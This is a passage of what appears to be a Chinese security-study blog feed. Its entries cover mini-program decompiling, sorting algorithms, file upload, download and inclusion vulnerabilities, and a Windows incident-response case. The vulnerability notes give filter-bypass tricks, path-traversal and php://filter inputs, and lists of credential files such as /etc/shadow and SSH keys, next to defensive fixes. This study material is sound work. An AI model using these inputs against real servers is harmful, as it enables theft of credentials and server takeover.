<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114653807.png" alt="image-20220829114653807"></p>
<p>反编译小程序压缩包 在文件夹下克隆反编译工具</p>
<p>git clone <a href="https://github.com/qwerty472123/wxappUnpacker.git">https://github.com/qwerty472123/wxappUnpacker.git</a></p>
<p>cd wxappUnpacker npm i</p>
<p>执行node node wuWxapkg.js + wxapkg文件路径 即可生成反编译后的微信小程序文件夹</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/1460000039121223.png" alt="img"></p>
<p>使用编辑器打开项目即可。</p>
]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2022/03/25/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>直接插入排序，将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的有序表。即：先将序列的第1个记录看成是一个<strong>有序的子序列</strong>，然后从第2个记录逐个进行插入，直至<strong>整个序列</strong>有序为止。<span id="more"></span></li>
<li>希尔排序，先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序</li>
<li>简单选择排序，在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</li>
<li>堆排序，由堆的定义可以看出，<strong>堆顶元素</strong>（即第一个元素）必为最小项（小顶堆）。<br>若以一维数组存储一个堆，则堆对应一棵完全二叉树，且所有非叶结点的值均不大于(或不小于)其子女的值，根结点（堆顶元素）的值是最小(或最大)的</li>
<li>冒泡排序，在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</li>
<li>快速排序</li>
<li>1）选择一个基准元素,通常选择第一个元素或者最后一个元素,</li>
<li>2）通过一趟排序将待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。</li>
<li>3）此时基准元素在其排好序后的正确位置</li>
<li>4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</li>
<li>归并排序</li>
<li>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</li>
<li>基数排序</li>
<li>是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。</li>
</ol>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h2><p>文件上传漏洞是指上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。用户可以上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。 常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。这种漏洞是getshell最快最直接的方法之一，上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件，有文件上传不一定有文件上传漏洞，要看代码情况。</p>
<span id="more"></span>
<h2 id="文件上传危害"><a href="#文件上传危害" class="headerlink" title="文件上传危害"></a>文件上传危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">自定义上传什么东西，通过文件上传上传网站后门，拿到网站权限，高危漏洞</span><br></pre></td></tr></table></figure>

<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">黑盒查找：代码，网站情况是不知道的需要自己判断，需要用扫描器去扫描敏感文件，扫描常见的上传地址，通过网站给出的上传应用或者后台去找。</span><br><span class="line">白盒查找：拿到源码，cms等等判断</span><br><span class="line">通过抓包修改数据进行判断</span><br></pre></td></tr></table></figure>

<h2 id="文件上传常见验证方式"><a href="#文件上传常见验证方式" class="headerlink" title="文件上传常见验证方式"></a>文件上传常见验证方式</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">后缀名：类型，文件头等</span><br><span class="line">文件头，MIME信息，image/gif，后缀</span><br><span class="line"><span class="section">黑名单:明确不让上传的格式后缀（黑名单缺陷：定义后缀名不完整的情况，可以通过其他格式绕过达到同样的效果，具体情况具体看待）asp php jsp aspx cgi war</span></span><br><span class="line">黑名单缺陷：php5，phtml（例如PHP：如果对方支持这个类型的格式的话是可以运行的）</span><br><span class="line"><span class="section">白名单:明确可以上传的格式后缀（白名单相对黑名单要安全点）Jpg png zip rar gif</span></span><br><span class="line"><span class="section">文件类型:MIME信息image/gif</span></span><br></pre></td></tr></table></figure>

<h2 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">JS验证绕过</span><br><span class="line">特殊解析后缀（php3，php5，phtml），.htaccess（apache）</span><br><span class="line">大小写</span><br><span class="line">点绕过</span><br><span class="line">空格绕过</span><br><span class="line">::<span class="variable">$$</span>DATA</span><br><span class="line">双后缀名绕过</span><br><span class="line">MIME绕过</span><br><span class="line">截断</span><br><span class="line">文件头检测</span><br><span class="line">二次渲染</span><br><span class="line">条件竞争</span><br><span class="line">突破getimagesize</span><br><span class="line">突破exif_imagetype</span><br></pre></td></tr></table></figure>

<h2 id="上传参数名解析-明确哪些东西能修改？"><a href="#上传参数名解析-明确哪些东西能修改？" class="headerlink" title="上传参数名解析:明确哪些东西能修改？"></a>上传参数名解析:明确哪些东西能修改？</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition-</span>:一般可更改</span><br><span class="line"><span class="attribute">name</span>:表单参数值，不能更改</span><br><span class="line"><span class="attribute">filename</span>:文件名，可以更改</span><br><span class="line"><span class="attribute">Content-type</span>:文件</span><br><span class="line">MIME，视情况更改</span><br></pre></td></tr></table></figure>

<h2 id="文件上传安全修复方案"><a href="#文件上传安全修复方案" class="headerlink" title="文件上传安全修复方案"></a>文件上传安全修复方案</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">后端验证：采用服务端验证模式</span><br><span class="line">后缀检测：基于黑名单，白名单过滤</span><br><span class="line">MIME检测：基于上传自带类型检测</span><br><span class="line">内容检测：文件头，完整性检测,后缀等等</span><br><span class="line">自带函数过滤：参考 uploadlabs函数</span><br><span class="line">自定义函数过滤：<span class="keyword">function</span> <span class="title">check_file</span>()</span><br><span class="line">WAF防护产品：安全狗，宝塔，云盾，安全公司类似产品等</span><br></pre></td></tr></table></figure>

<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">建立\*.asa,\*.asp文件夹时，文件夹下的任意文件都会被当成asp文件来执行</span><br><span class="line">\*.asp;1.jpg同样会被当成asp脚本执行</span><br></pre></td></tr></table></figure>

<h3 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">默认Fast-CGI开启，直接在url中图片地址后面输入<span class="string">/1.php</span>，会把正常图片当成php解析</span><br></pre></td></tr></table></figure>

<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">当文件拓展名Apache没有配置解析器解析时，就会向前遍历，直到遇到配置的解析器解析的域名</span><br></pre></td></tr></table></figure>

<h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">上传<span class="string">/.php</span>时就能作为php文件解析</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件下载功能没有对下载的文件类型、目录做合理严谨的过滤， 利用路径回溯符…/跳出程序本身的限制目录实现来下载任意文件，导致用户可以下载服务器的任意文件。</p>
<span id="more"></span>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。</span><br><span class="line">可用得到的代码进一步代码审计，得到更多可利用漏洞</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br></pre></td></tr></table></figure>

<h2 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">网站URL中存在下载参数，并且未进行过滤…<span class="regexp">/…/</span>…/字符，且输出了文件内容</span><br><span class="line">从链接上看</span><br><span class="line">从参数上看</span><br><span class="line">具体情况具体分析</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">获得站点源码（黑盒 -&gt; 白盒）</span><br><span class="line">获得站点与中间件配置文件</span><br><span class="line">获得应用于系统配置文件（ssh、mysql）</span><br></pre></td></tr></table></figure>

<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件/代码文件 &gt;&gt; 利用服务器软件漏洞&gt; <span class="built_in">shell</span>&gt; 提权）</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br><span class="line">下载常规的配置文件，例如: ssh,weblogic,<span class="keyword">ftp</span>,mysql等相关配置下载各种.<span class="built_in">log</span>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</span><br><span class="line">下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</span><br></pre></td></tr></table></figure>

<h2 id="常规文件位置"><a href="#常规文件位置" class="headerlink" title="常规文件位置"></a>常规文件位置</h2><p><strong>WEB应用</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">PHP</span></span><br><span class="line">1、获取inc/config·php获得数据库连接字符串中的口令信息。</span><br><span class="line"><span class="meta">#</span><span class="bash">asp</span></span><br><span class="line">1、获取inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。若是ACCESS数据库，可以得到数据库</span><br><span class="line">路径，在下载数据库内容。</span><br><span class="line"><span class="meta">#</span><span class="bash">aspx</span></span><br><span class="line">1、获取网站根目录web，config文件，获得数据库连接字符串中的口令信息。</span><br><span class="line">2、获取bin/*.dll文件，获取网站源码（不完整代码）。使用.NET refl ector工具打开编译后的dll文件。</span><br><span class="line"><span class="meta">#</span><span class="bash">JSP</span></span><br><span class="line">1、获取conf/tomcat-user.xml文件，获得tomcat管理界面的口令信息，上传war包GetShel1，</span><br><span class="line">2、获取WEB-INF/Web.xml文件，获得数据库连接字符串中的口令信息。</span><br></pre></td></tr></table></figure>

<p><strong>应用，系统配置文件</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">一、Windows</span><br><span class="line">C:\boot.ini<span class="regexp">//</span>查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml<span class="regexp">//</span>IIS配置文件</span><br><span class="line">C:\Windows\repair\sam<span class="regexp">//</span>存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini<span class="regexp">//</span>Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD <span class="regexp">//</span>Mysql root</span><br><span class="line">C:\Windows\php.ini<span class="regexp">//</span>php配置信息</span><br><span class="line">C:\Windows\my.ini<span class="regexp">//</span>Mysql配置信息</span><br><span class="line">C:\Windows\win.ini<span class="regexp">//</span>Windows系统的一个基本系统配置文件</span><br><span class="line">二、Linux</span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh<span class="regexp">/known_hosts/</span><span class="regexp">/记录每个访问计算机用户的公钥/</span>etc/passwd</span><br><span class="line"><span class="regexp">/etc/</span>shadow</span><br><span class="line"><span class="regexp">/etc/my</span>.cnf<span class="regexp">//my</span>sql配置文件</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf<span class="regexp">//</span>apachel配置文件</span><br><span class="line"><span class="regexp">/root/</span>.bash_history<span class="regexp">//</span>用户历史命令记录文件</span><br><span class="line"><span class="regexp">/root/</span>.mysql._history<span class="regexp">//my</span>sql历史命令记录文件</span><br></pre></td></tr></table></figure>

<h2 id="任意文件下载漏洞防御"><a href="#任意文件下载漏洞防御" class="headerlink" title="任意文件下载漏洞防御"></a>任意文件下载漏洞防御</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">下载路径不可控，而是程序自动生成后保存在数据库中，根据<span class="selector-tag">ID</span>进行下载</span><br><span class="line">对参数做严格的过滤，不能进行目录遍历（穿越）</span><br><span class="line">对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型</span><br><span class="line">过滤.(点)，使用户在<span class="selector-tag">url</span>中不能回溯上级目录</span><br><span class="line">正则严格判断用户输入参数的格式</span><br><span class="line">限定文件访问范围如<span class="selector-tag">PHP</span>里的（<span class="selector-tag">php</span><span class="selector-class">.ini</span>配置<span class="selector-tag">open_basedir</span>）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。为了控制代码的灵活，程序要把要使用的函数写到一个文件中，其他需要其中的的函数执行，只需要通过该文件名包含进来，而且没有进行验证。</p>
<span id="more"></span>

<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><p><strong>本地包含</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">当被包含的文件在服务器本地时，且能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞</span><br></pre></td></tr></table></figure>

<p><strong>远程包含</strong></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">远程文件包含和本地文件包含造成漏洞的原因是一样的，当开发配置可以读取远程文件时，例如php.ini 中的配置选项allow_url_fopen和allow_url_include为<span class="keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。</span><br><span class="line">代码限制：代码里面限制只能包含本地文件的话就不会有远程包含，如果没限制的话，并且在设置上允许包含远程文件的话，就会引起远程包含</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">通过文件以脚本去执行</span><br><span class="line">文件包含常用函数</span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">include_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">漏扫工具</span><br><span class="line">公开漏洞</span><br><span class="line">手工看参数以及功能点</span><br><span class="line"><span class="number">1</span>、通过观察参数特征猜测是否使用文件包含，文件包含参数后面为具体文件名如：http:<span class="regexp">//</span>example.com/index.php?page=include.php</span><br><span class="line">http:<span class="regexp">//</span>example.com/index.php?page=include</span><br><span class="line"><span class="number">2</span>、通过..<span class="regexp">/目录跳转符尝试读取系统文件、服务器日志文件或者配置文件。如读取Linux的/</span>etc<span class="regexp">/passwd文件: http:/</span><span class="regexp">/example.com/i</span>ndex.php?page=..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="number">3</span>、通过php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=index.php读取代码文件。</span><br><span class="line"><span class="number">4</span>、通过包含远程服务器上的PHP代码文件执行代码。</span><br><span class="line"><span class="number">5</span>、如果站点存在一个文件上传功能，只允许图片类型文件，并且存在文件包含漏洞，则可以把PHP代码写入图片文件中，再通过文件包含漏洞包含之，进而执行PHP代码。</span><br><span class="line"><span class="number">6</span>、如果文件的后缀可考虑使用截断进行包含：</span><br><span class="line">  <span class="number">1</span>)%<span class="number">00</span>截断（PHP小于<span class="number">5.3</span>.<span class="number">4</span>，magic_quotes_gpc=off）</span><br><span class="line">  <span class="number">2</span>)路径长度截断：</span><br><span class="line">  <span class="regexp">/etc/</span>passwd<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.[n*/.]（Linux文件名需要长于<span class="number">4096</span>，Windows 需要长于<span class="number">256</span>）</span><br></pre></td></tr></table></figure>

<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">1.读取目标机上敏感文件</span><br><span class="line">2.远程文件包含可运行的PHP木马</span><br><span class="line">3、配合文件上传漏洞获取webshll</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">固定文件后缀</span><br><span class="line">固定使用的文件</span><br><span class="line">安装WAF</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次windows应急响应</title>
    <url>/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h1 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h1><p>大好假期，人在家中躺，应急天上来，上了机子之后过程还算是比较顺利的，环境是Tomcat，大致思路就是，排查可疑用户和文件，看日志，连接情况，进程，定时任务，注册表这些。</p>
<span id="more"></span>
<h1 id="2、排查可疑用户和文件"><a href="#2、排查可疑用户和文件" class="headerlink" title="2、排查可疑用户和文件"></a>2、排查可疑用户和文件</h1><p>先排查下有没有隐藏的用户</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404011544732.png" alt="image-20220404011544732"></p>
<p>用了net user和net user localgroup administrators都没办法看到，但是还是有可能存在隐藏用户，隐藏用户有三种方式：</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>特定</th>
</tr>
</thead>
<tbody><tr>
<td>命令添加</td>
<td>net user没办法查看隐藏用户<br>RDP登录过的，都会生成对应的用户目录<br>系统登录界面可以选择登录用户</td>
</tr>
<tr>
<td>克隆账号</td>
<td>net user无法查看隐藏用户<br>RDP登录不会生成相应的用户目录<br>系统登录界面选择登录用户，无法查看</td>
</tr>
<tr>
<td>Guest账号利用</td>
<td>正常都能够查看出来，但是一般会被忽略，隐蔽性相对来说会高点</td>
</tr>
</tbody></table>
<p>建议开个PCHunter看下，一般都能查出来，看出来这边是存在一个test$的隐藏用户，用net user XXX$验证下</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404021642321.png" alt="image-20220404021642321"></p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404022054841.png" alt="image-20220404022054841"></p>
<p>接着看下有没有可疑的文件在，先排查web的目录，后面再去看看系统有没有被放了CS马啥的，因为是部署的tomcat，一般站点文件都会部署在tomcat\webapps下面，先按照修改时间排序下，发现了两个不像好人的文件，打开代码一看，一个是webshell，一个是代理</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404023530823.png" alt="image-20220404023530823"></p>
<p>这次是运气好，直接用时间排序查出来的文件，在找webshell和代理的时候，根据日志的访问记录和文件修改时间去查找效果会更好一点，日志能看到攻击者一直在访问那个文件，这样在定位webshell的时候会更加有目标一点，或者使用D盾扫描，也能扫描出webshell。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404125014083.png" alt="image-20220404125014083"></p>
<h1 id="3、定位机器失陷时间"><a href="#3、定位机器失陷时间" class="headerlink" title="3、定位机器失陷时间"></a>3、定位机器失陷时间</h1><p>有挺多种方法去定位的，看系统安全日志或者中间件的日志等等，这边我先去看的tomcat的日志，tomcat的日志分五种：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 应用日志</span><br><span class="line">该日志主要是记录应用事件的，针对应用级别的排错比较有用，比如应用性能比较慢。</span><br><span class="line">2. 服务器日志</span><br><span class="line">服务器日志和console日志是相同的，不同之处在于，服务器日志是保存在文件中的，可以随时查看。</span><br><span class="line">3. 控制台日志</span><br><span class="line">该日志记录了tomcat的启动和加载器的顺序的详细信息，该日志文件叫做catalina.out。在排查服务器启动、应用的部署错时比较有用。 配置日志是在catalina.sh中配置的。</span><br><span class="line">4. 访问日志</span><br><span class="line">该日志也非常重要，在分析很多应用的流量，带宽需求，及负载时非常有用。该日志是在server.xml中配置的。</span><br><span class="line">5. Host manager</span><br><span class="line">使用Tomcat Manager执行的活动日志，比如不同的任务执行，应用的状态，应用的部署，和tomcat的生命周期，这些配置是在logging.properties.</span><br></pre></td></tr></table></figure>

<p>如果是因为站点有漏洞被传了马上去，可以看下localhost_access_log这个日志，这个是访问tomcat的日志，请求时间和资源，状态码都有记录，在日志量大的情况下可以自己去定义下，筛选文件和状态码，先把200的状态码筛选出来，然后再根据上面定位到的webshell去搜索日志信息。所以我第一时间先去找webshell，就是方便现在去定位大概攻击成功的时间和文件。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404131319354.png" alt="image-20220404131319354"></p>
<h1 id="4、计划任务-amp-注册表"><a href="#4、计划任务-amp-注册表" class="headerlink" title="4、计划任务&amp;注册表"></a>4、计划任务&amp;注册表</h1><p>计划任务的查看有很多种方式</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>at（适用于win2003-win2008）</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
<tr>
<td>schtasks.exe（win2008及其以后系统）</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
<tr>
<td>控制面板-&gt;计划任务</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
</tbody></table>
<p>单独看一个地方的话，会参杂大量的计划任务，干扰检查，最好就是多个搭配起来，配合计划任务的文件去检查，通过查看目录修改日期-&gt;文件修改日期，根据这两个信息，去计划任务程序里面定位，然后再查看具体内容，这就是为什么要去定位攻击成功的时间了，能有效帮助我们去排查计划任务的创建时间。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404135302797.png" alt="image-20220404135302797"></p>
<p>打开代码看下，在最下面发现的启动的文件路径</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404135655403.png" alt="image-20220404135655403"></p>
<p>打开这个EXE，查看代码，在最下面看到了IP，是个阿里云的服务器，丢云沙箱一看，是个CS马。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404141147090.png" alt="image-20220404141147090"></p>
<p>当然我这种是比较笨的方式，这种可以直接丢云沙箱上面看下结果或者配合CurrPorts去分析，打开这个exe之后观察变化，或者看CurrPorts的log文件，也能够分析出这个IP，只是习惯先编辑一下，看看里面拿到内容，一般拉到最后面都能看到一些东西，找到CS马之后，去看windows自启动的注册表定位起来也会方便点，重点查看windows的自启动配置的注册表。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404142723461.png" alt="image-20220404142723461"></p>
<h1 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h1><p>这次的检查算是比较简单的，没有特别难找的东西，有一些是直接找出来的，没有啥特别的技巧，多排查几个机子，就有种直觉，感觉有点问题。最后猜测下攻击链：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">爆破Tomcat后台</span><br><span class="line">部署webshell、HTTP隧道代理</span><br><span class="line">上<span class="keyword">CS</span>木马进行权限维持</span><br><span class="line">创建后门管理员权限账号（<span class="keyword">test</span>$）</span><br><span class="line">利用 mimikatz 抓取管理员用户的密码</span><br><span class="line">用管理员账号登录服务器</span><br><span class="line">清除操作痕迹（清空安全日志）</span><br><span class="line">利用计划任务、自启动等进行权限维持</span><br></pre></td></tr></table></figure>

<p>在检查的时候，如果遇到很多数据干扰的话可以配合其他方式或者是时间，文件名，状态码去筛选，可以过滤掉绝大多数的垃圾数据再配合一些工具，D盾，PCHunter之类的能让检查顺利很多。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2022/01/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a><strong>逻辑漏洞</strong></h1><ul>
<li> 攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性， 其本质就是程序逻辑输入管控不严，没有对用户数据进行严格把控，导致程序不能够正常处理或处理错误，一般出现在登录注册、密码找回、信息查看、交易支付金额等。<span id="more"></span></li>
</ul>
